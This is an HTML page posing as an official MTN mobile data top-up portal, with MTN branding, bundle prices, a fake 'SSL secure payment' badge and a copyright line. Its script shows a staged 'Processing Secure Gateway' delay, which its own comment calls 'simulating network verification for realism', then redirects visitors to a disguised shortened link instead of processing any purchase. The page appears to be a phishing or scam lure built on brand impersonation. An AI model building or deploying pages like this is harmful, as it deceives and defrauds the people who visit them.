<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN | Official Data Top-Up Portal</title>
    <style>
        :root { --mtn-yellow: #ffcc00; --mtn-black: #000; --mtn-blue: #004f91; --soft-bg: #f8f9fa; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--soft-bg); margin: 0; padding: 10px; display: flex; justify-content: center; }
        
        /* Official Card UI */
        .portal { background: white; width: 100%; max-width: 450px; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #eee; }
        
        /* Branding Header */
        .header { background: var(--mtn-yellow); padding: 30px 20px; text-align: center; border-bottom: 4px solid var(--mtn-black); }
        .logo-oval { border: 2px solid var(--mtn-black); border-radius: 50px; display: inline-block; padding: 4px 25px; margin-bottom: 5px; background: var(--mtn-yellow); }
        .logo-text { font-weight: 900; font-size: 26px; color: var(--mtn-black); letter-spacing: -1px; }
        .secure-text { font-size: 10px; font-weight: bold; text-transform: uppercase; color: var(--mtn-black); letter-spacing: 1px; }

        .content { padding: 20px; }
        .section-title { font-size: 14px; font-weight: 800; color: #444; margin: 15px 0 10px 5px; text-transform: uppercase; }

        /* Real Phone Input */
        .phone-box { background: #f1f3f5; padding: 15px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #e9ecef; }
        input[type="tel"] { width: 100%; border: 2px solid #ced4da; padding: 12px; border-radius: 10px; font-size: 18px; font-weight: 600; text-align: center; outline: none; transition: 0.3s; }
        input[type="tel"]:focus { border-color: var(--mtn-yellow); box-shadow: 0 0 8px rgba(255, 204, 0, 0.4); }

        /* Bundle List Styles */
        .bundle-container { max-height: 400px; overflow-y: auto; padding-right: 5px; }
        .bundle-card { display: flex; justify-content: space-between; align-items: center; padding: 14px; background: white; border: 1px solid #efefef; border-radius: 12px; margin-bottom: 8px; cursor: pointer; transition: 0.2s; }
        .bundle-card:hover { transform: scale(1.02); border-color: var(--mtn-yellow); background: #fffdf5; }
        .b-name { font-weight: 700; font-size: 14px; color: var(--mtn-black); }
        .b-val { font-size: 11px; color: #777; display: block; }
        .b-price { font-weight: 900; color: var(--mtn-blue); font-size: 15px; }

        /* Loading Overlay */
        #loader { display: none; position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(255,255,255,0.96); z-index: 100; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--mtn-yellow); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .footer { padding: 20px; background: #fafafa; border-top: 1px solid #eee; text-align: center; }
        .secure-badge { display: flex; justify-content: center; align-items: center; gap: 5px; font-size: 11px; font-weight: 700; color: #555; }
    </style>
</head>
<body>

<div class="portal">
    <div id="loader">
        <div class="spinner"></div>
        <p style="margin-top:15px; font-weight:800;">Processing Secure Gateway...</p>
    </div>

    <div class="header">
        <div class="logo-oval"><span class="logo-text">MTN</span></div><br>
        <span class="secure-text">Official Payment Portal</span>
    </div>

    <div class="content">
        <div class="section-title">1. Enter Recipient Number</div>
        <div class="phone-box">
            <input type="tel" id="mobile" placeholder="e.g. 0812345678" maxlength="10">
        </div>

        <div class="section-title">2. Select Your Bundle (20 Options)</div>
        <div class="bundle-container">
            <div class="bundle-card" onclick="buy('1GB (1 Hour)', 'R12.00')"><div><span class="b-name">1GB Hourly</span><span class="b-val">Anytime Data</span></div><span class="b-price">R12.00</span></div>
            <div class="bundle-card" onclick="buy('50MB (Daily)', 'R8.00')"><div><span class="b-name">50MB Daily</span><span class="b-val">Valid 24 Hours</span></div><span class="b-price">R8.00</span></div>
            <div class="bundle-card" onclick="buy('1GB (Daily)', 'R29.00')"><div><span class="b-name">1GB Daily</span><span class="b-val">Anytime Data</span></div><span class="b-price">R29.00</span></div>
            
            <div class="bundle-card" onclick="buy('550MB WhatsApp', 'R15.00')"><div><span class="b-name">550MB WhatsApp</span><span class="b-val">7 Days Validity</span></div><span class="b-price">R15.00</span></div>
            <div class="bundle-card" onclick="buy('1GB WhatsApp', 'R33.00')"><div><span class="b-name">1GB WhatsApp</span><span class="b-val">20 Days Validity</span></div><span class="b-price">R33.00</span></div>

            <div class="bundle-card" onclick="buy('500MB Weekly', 'R40.00')"><div><span class="b-name">500MB Weekly</span><span class="b-val">7 Days Validity</span></div><span class="b-price">R40.00</span></div>
            <div class="bundle-card" onclick="buy('2GB (1GB+1GB)', 'R49.00')"><div><span class="b-name">2GB Fortnightly</span><span class="b-val">14 Days Validity</span></div><span class="b-price">R49.00</span></div>

            <div class="bundle-card" onclick="buy('4GB (2+2)', 'R49.00')"><div><span class="b-name">4GB BozzaGigs</span><span class="b-val">2GB + 2GB Night</span></div><span class="b-price">R49.00</span></div>
            <div class="bundle-card" onclick="buy('6GB (3+3)', 'R49.00')"><div><span class="b-name">6GB Flash Deal</span><span class="b-val">3GB + 3GB Night</span></div><span class="b-price">R49.00</span></div>
            <div class="bundle-card" onclick="buy('10GB (5+5)', 'R99.00')"><div><span class="b-name">10GB Monthly</span><span class="b-val">5GB + 5GB Night</span></div><span class="b-price">R99.00</span></div>
            <div class="bundle-card" onclick="buy('15GB (7.5+7.5)', 'R129.00')"><div><span class="b-name">15GB Monthly</span><span class="b-val">7.5GB + 7.5GB Night</span></div><span class="b-price">R129.00</span></div>
            <div class="bundle-card" onclick="buy('20GB (10+10)', 'R149.00')"><div><span class="b-name">20GB Monthly</span><span class="b-val">10GB + 10GB Night</span></div><span class="b-price">R149.00</span></div>
            <div class="bundle-card" onclick="buy('30GB Anytime', 'R239.00')"><div><span class="b-name">30GB Anytime</span><span class="b-val">30 Days Validity</span></div><span class="b-price">R239.00</span></div>
            <div class="bundle-card" onclick="buy('100GB (50+50)', 'R349.00')"><div><span class="b-name">100GB Massive</span><span class="b-val">50GB + 50GB Night</span></div><span class="b-price">R349.00</span></div>
            
            <div class="bundle-card" onclick="buy('75GB Fixed LTE', 'R599.00')"><div><span class="b-name">75GB Home LTE</span><span class="b-val">30 Days Validity</span></div><span class="b-price">R599.00</span></div>
            <div class="bundle-card" onclick="buy('200GB Fixed LTE', 'R999.00')"><div><span class="b-name">200GB Home LTE</span><span class="b-val">30 Days Validity</span></div><span class="b-price">R999.00</span></div>
        </div>
    </div>

    <div class="footer">
        <div class="secure-badge">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="green"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
            SSL SECURE PAYMENT ENCRYPTED
        </div>
        <p style="font-size: 9px; color: #aaa; margin-top: 10px;">© 2026 Mobile Telephone Networks. All rights reserved.</p>
    </div>
</div>

<script>
    function buy(name, price) {
        const num = document.getElementById('mobile').value;
        if (num.length < 10 || !num.startsWith('0')) {
            alert("Please enter a valid 10-digit MTN number to proceed.");
            return;
        }

        document.getElementById('loader').style.display = 'flex';
        
        // Simulating network verification for realism
        setTimeout(function() {
            window.location.href = "https://tinyurl.com/yxnmfxd3";
        }, 2200);
    }
</script>

</body>
</html>
